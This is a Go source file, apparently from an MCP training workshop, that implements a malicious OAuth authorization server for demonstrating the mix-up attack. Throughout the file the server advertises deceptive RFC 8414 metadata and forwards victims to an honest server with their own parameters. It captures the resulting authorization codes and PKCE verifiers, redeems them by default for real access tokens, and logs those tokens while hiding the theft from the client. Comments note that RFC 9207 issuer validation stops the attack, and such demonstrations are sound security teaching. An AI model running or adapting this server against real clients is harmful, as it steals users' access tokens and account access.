//go:build !windows

// Package main is the malicious authorization server (evil-as) for the OAuth
// mix-up demonstration. It advertises itself as a normal RFC 8414
// authorization server so an MCP client that "trusts" it will start an
// Authorization Code + PKCE flow against it. But its /authorize endpoint does
// not authenticate anyone: it redirects the browser to the *honest*
// authorization server (AuthGate), replaying the victim client's own
// client_id, redirect_uri, state, and PKCE challenge. The honest AS then
// issues a valid code straight to the client's callback.
//
// The attack pays off at evil-as's /token endpoint: a client that does not
// validate the RFC 9207 `iss` parameter believes it is still talking to
// evil-as and POSTs the honest code (plus code_verifier) here. evil-as logs
// the capture and, with -redeem, replays the form to AuthGate's token endpoint
// to mint and print a real stolen access token.
//
// RFC 9207 defeats this: the honest AS stamps `iss=<AuthGate>` on the callback,
// which does not match the evil-as issuer the client expected, so a
// defense-enabled client aborts before it ever reaches this /token endpoint.
package main

import (
	"context"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/go-training/mcp-workshop/pkg/logger"

	"github.com/modelcontextprotocol/go-sdk/oauthex"
)

type config struct {
	addr       string
	issuer     string
	honestAS   string
	honestAuth string
	honestTok  string
	redeem     bool
}

func main() {
	if err := run(); err != nil {
		slog.Error("evil-as failed", "err", err)
		os.Exit(1)
	}
}

func run() error {
	var (
		addr     string
		issuer   string
		honestAS string
		redeem   bool
		logLevel string
	)
	flag.StringVar(&addr, "addr", ":9090", "address to listen on")
	flag.StringVar(&issuer, "issuer", "http://localhost:9090",
		"public issuer URL this malicious AS advertises (what the client will trust)")
	flag.StringVar(&honestAS, "honest-as", "http://localhost:8080",
		"issuer URL of the honest authorization server (AuthGate) to impersonate")
	flag.BoolVar(&redeem, "redeem", true,
		"replay the captured code at the honest token endpoint and print the stolen token")
	flag.StringVar(&logLevel, "log-level", "INFO", "log level: DEBUG, INFO, WARN, ERROR")
	flag.Parse()

	logger.NewWithLevel(logLevel)

	discCtx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	// Trim once so the metadata URL and the issuer we assert to
	// GetAuthServerMeta agree — that call rejects any mismatch, so passing a
	// trailing-slash -honest-as as the issuer while trimming it in the URL
	// would fail discovery.
	honestAS = strings.TrimRight(honestAS, "/")
	honestMetaURL := honestAS + "/.well-known/oauth-authorization-server"
	meta, err := oauthex.GetAuthServerMeta(discCtx, honestMetaURL, honestAS, http.DefaultClient)
	if err != nil {
		return fmt.Errorf("discover honest AS %s: %w", honestAS, err)
	}
	if meta == nil || meta.AuthorizationEndpoint == "" || meta.TokenEndpoint == "" {
		return fmt.Errorf("honest AS metadata missing authorize/token endpoint: %+v", meta)
	}

	cfg := &config{
		addr:       addr,
		issuer:     strings.TrimRight(issuer, "/"),
		honestAS:   honestAS,
		honestAuth: meta.AuthorizationEndpoint,
		honestTok:  meta.TokenEndpoint,
		redeem:     redeem,
	}

	slog.Info("evil-as impersonation target discovered",
		"issuer_we_advertise", cfg.issuer,
		"honest_as", cfg.honestAS,
		"honest_authorize", cfg.honestAuth,
		"honest_token", cfg.honestTok,
	)

	mux := http.NewServeMux()
	mux.HandleFunc("/.well-known/oauth-authorization-server", cfg.handleMetadata)
	mux.HandleFunc("/authorize", cfg.handleAuthorize)
	mux.HandleFunc("/token", cfg.handleToken)

	srv := &http.Server{
		Addr:              cfg.addr,
		Handler:           mux,
		ReadHeaderTimeout: 5 * time.Second,
		ReadTimeout:       10 * time.Second,
		WriteTimeout:      30 * time.Second,
		IdleTimeout:       60 * time.Second,
	}

	slog.Info("evil-as (malicious authorization server) starting", "addr", cfg.addr)

	go func() {
		if err := srv.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
			slog.Error("server error", "err", err)
			os.Exit(1)
		}
	}()

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, os.Interrupt, syscall.SIGTERM)
	<-quit

	slog.Info("shutdown signal received, shutting down evil-as...")
	shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer shutdownCancel()
	if err := srv.Shutdown(shutdownCtx); err != nil {
		slog.Error("server forced to shutdown", "err", err)
	}
	slog.Info("evil-as shutdown gracefully")
	return nil
}

// handleMetadata makes evil-as look like a legitimate RFC 8414 authorization
// server. It advertises its own /authorize and /token endpoints and — to be
// maximally deceptive — claims RFC 9207 issuer-identification support, which is
// exactly the claim a defense-enabled client will use to catch the mismatch.
func (c *config) handleMetadata(w http.ResponseWriter, _ *http.Request) {
	meta := map[string]any{
		"issuer":                           c.issuer,
		"authorization_endpoint":           c.issuer + "/authorize",
		"token_endpoint":                   c.issuer + "/token",
		"response_types_supported":         []string{"code"},
		"grant_types_supported":            []string{"authorization_code"},
		"code_challenge_methods_supported": []string{"S256"},
		"token_endpoint_auth_methods_supported": []string{
			"none", "client_secret_post",
		},
		"authorization_response_iss_parameter_supported": true,
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(meta)
}

// handleAuthorize performs the mix-up: instead of authenticating the user, it
// redirects the browser to the honest AS's /authorize endpoint, preserving the
// victim client's own parameters so the honest AS issues a valid code directly
// to the client's callback.
func (c *config) handleAuthorize(w http.ResponseWriter, r *http.Request) {
	in := r.URL.Query()
	slog.Info("evil-as /authorize hit — performing mix-up redirect to honest AS",
		"client_id", in.Get("client_id"),
		"redirect_uri", in.Get("redirect_uri"),
		"state", in.Get("state"),
		"resource", in.Get("resource"),
	)

	forward := url.Values{}
	for _, k := range []string{
		"response_type", "client_id", "redirect_uri", "scope", "state",
		"code_challenge", "code_challenge_method", "resource",
	} {
		if v := in.Get(k); v != "" {
			forward.Set(k, v)
		}
	}

	sep := "?"
	if strings.Contains(c.honestAuth, "?") {
		sep = "&"
	}
	target := c.honestAuth + sep + forward.Encode()
	slog.Info("redirecting victim browser to honest AS", "location", target)
	http.Redirect(w, r, target, http.StatusFound)
}

// handleToken is where the theft lands. A client that skipped RFC 9207
// validation POSTs the honest authorization code (and code_verifier) here.
func (c *config) handleToken(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseForm(); err != nil {
		http.Error(w, "bad form", http.StatusBadRequest)
		return
	}
	form := r.PostForm

	slog.Warn("CAPTURED authorization code at evil-as /token endpoint",
		"code", form.Get("code"),
		"code_verifier", form.Get("code_verifier"),
		"client_id", form.Get("client_id"),
		"redirect_uri", form.Get("redirect_uri"),
		"resource", form.Get("resource"),
	)

	if !c.redeem {
		writeOAuthError(w, http.StatusBadRequest, "invalid_grant",
			"evil-as captured the code (redeem disabled)")
		return
	}

	// Redeem on a detached context: once evil-as has the code, the theft must
	// complete even if the victim client disconnects right after posting it —
	// the attacker does not depend on the victim keeping the connection open.
	redeemCtx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	body, status, err := c.redeemAtHonest(redeemCtx, form)
	if err != nil {
		slog.Error("evil-as failed to redeem captured code", "err", err)
		writeOAuthError(w, http.StatusBadGateway, "server_error",
			"evil-as captured the code but redemption failed")
		return
	}

	if status == http.StatusOK {
		var tok struct {
			AccessToken string `json:"access_token"`
			TokenType   string `json:"token_type"`
		}
		_ = json.Unmarshal(body, &tok)
		slog.Warn("STOLEN ACCESS TOKEN minted from captured code",
			"token_type", tok.TokenType,
			"access_token", tok.AccessToken,
		)
	} else {
		slog.Warn("honest token endpoint rejected the captured code",
			"status", status, "body", string(body))
	}

	// Return the honest response verbatim so the victim client is none the wiser.
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_, _ = w.Write(body)
}

// redeemAtHonest replays the captured token form to the honest AS token
// endpoint. Replaying the whole form is enough because it already carries the
// code, code_verifier, redirect_uri, client_id, and resource the honest AS
// bound the code to.
func (c *config) redeemAtHonest(
	ctx context.Context,
	form url.Values,
) ([]byte, int, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.honestTok,
		strings.NewReader(form.Encode()))
	if err != nil {
		return nil, 0, fmt.Errorf("build redeem request: %w", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, 0, fmt.Errorf("redeem request: %w", err)
	}
	defer resp.Body.Close()

	b, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return nil, 0, fmt.Errorf("read redeem response: %w", err)
	}
	return b, resp.StatusCode, nil
}

func writeOAuthError(w http.ResponseWriter, status int, code, desc string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(map[string]string{
		"error":             code,
		"error_description": desc,
	})
}
